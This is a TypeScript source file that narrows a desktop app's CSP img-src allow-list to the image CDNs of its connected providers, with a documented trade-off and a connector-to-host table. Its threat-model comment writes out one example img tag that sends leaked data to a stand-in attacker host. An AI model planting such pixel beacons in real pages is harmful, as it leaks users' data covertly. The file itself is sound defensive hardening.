/**
 * CSP `img-src` allow-list for thumbnails / cover images from each
 * first-class connected provider.
 *
 * Replaces the previous wildcard `https:` source, which let arbitrary
 * HTTPS hosts (including trackers / pixel beacons) load images into the
 * renderer. Each entry is documented with the CDN host it represents
 * and the connector that needs it. Adding a new connector means
 * widening this list explicitly (not silently inheriting `https:`).
 *
 * ## Known trade-off: user-pasted arbitrary image URLs
 *
 * `apps/desktop/renderer/src/editors/baseviews/GalleryView.tsx` renders
 * a cover image from any string the user pastes into the configured
 * `url` field of a Base record. With the previous `https:` wildcard,
 * users could paste S3 / Cloudflare R2 / imgur / Dropbox / custom-CDN
 * URLs and the image would load. After this narrowing, ONLY images
 * hosted on the connector CDNs below will render — pasted URLs from
 * other origins will be silently blocked by the renderer (CSP
 * violations surface as devtools warnings but don't fail the page).
 *
 * This is a deliberate trade-off. The threat model:
 * arbitrary `https:` image sources are an exfiltration channel — a
 * pasted `<img src="https://attacker.example/pixel.png?leak=...">`
 * would have made an outbound request carrying any query-string the
 * attacker chose. The narrowing closes that channel at the cost of
 * blocking user-uploaded images from CDNs we don't recognise.
 *
 * If a user reports a broken cover image: (a) widen this allow-list
 * in code to include the new CDN (requires a release), or (b) wait
 * for the planned per-Base "trust this host" UX (tracked in an earlier release
 * follow-ups — not yet implemented). The CSP violation is observable
 * in devtools as `Refused to load the image '<url>' because it
 * violates the following Content Security Policy directive: "img-src
 * 'self' data: ..."`. `main.ts` ALSO installs an `installCSPDevtoolsLogger`
 * to emit a `[Tessera CSP]` warning on every blocked resource so the
 * cause is obvious without opening devtools.
 *
 * Style notes:
 *
 * - We use scheme + host (no path) per CSP 3 grammar; wildcards are
 *   allowed only at the leftmost subdomain position (`https://*.host`)
 *   per [CSP spec](https://www.w3.org/TR/CSP3/#match-url-to-source-list).
 * - Plain HTTP is never allowed; the `default-src 'self'` baseline
 *   prevents leaks from `<img>` tags that point at `http:` URLs.
 *
 * Connector → CDN mapping:
 *
 * | Connector              | Image host                                  | Notes |
 * |---|---|---|
 * | Google Drive / Google  | `https://*.googleapis.com`                  | Drive API direct asset endpoints |
 * |                        | `https://*.googleusercontent.com`           | `lh3.googleusercontent.com` thumbnails, Photos previews |
 * | OneDrive / MS Graph    | `https://graph.microsoft.com`               | Direct Graph API thumbnail responses |
 * |                        | `https://*.sharepoint.com`                  | SharePoint-hosted images, OneDrive Personal |
 * |                        | `https://*.office.net`                      | Office app icons / shared assets |
 * | Notion                 | `https://*.notion.so`                       | Page-asset URLs |
 * |                        | `https://*.notion-static.com`               | S3-backed user uploads (`secure.notion-static.com`) |
 * | Atlassian              | `https://*.atlassian.net`                   | Jira/Confluence avatars, attachment thumbnails |
 * |                        | `https://*.atlassian.com`                   | Marketplace avatars, account avatars |
 * | Figma                  | `https://*.figma.com`                       | File thumbnails AND pre-signed `s3-alpha-sig.figma.com` REST asset URLs (covered by the wildcard, no separate entry needed). |
 *
 * The `data:` scheme is appended separately in `main.ts` because it's a
 * special CSP keyword, not an origin.
 */
export const cspImageSources: readonly string[] = Object.freeze([
  // Google
  "https://*.googleapis.com",
  "https://*.googleusercontent.com",

  // Microsoft (OneDrive, Graph, SharePoint, Office)
  "https://graph.microsoft.com",
  "https://*.sharepoint.com",
  "https://*.office.net",

  // Notion
  "https://*.notion.so",
  "https://*.notion-static.com",

  // Atlassian (Jira, Confluence)
  "https://*.atlassian.net",
  "https://*.atlassian.com",

  // Figma
  "https://*.figma.com",
]);
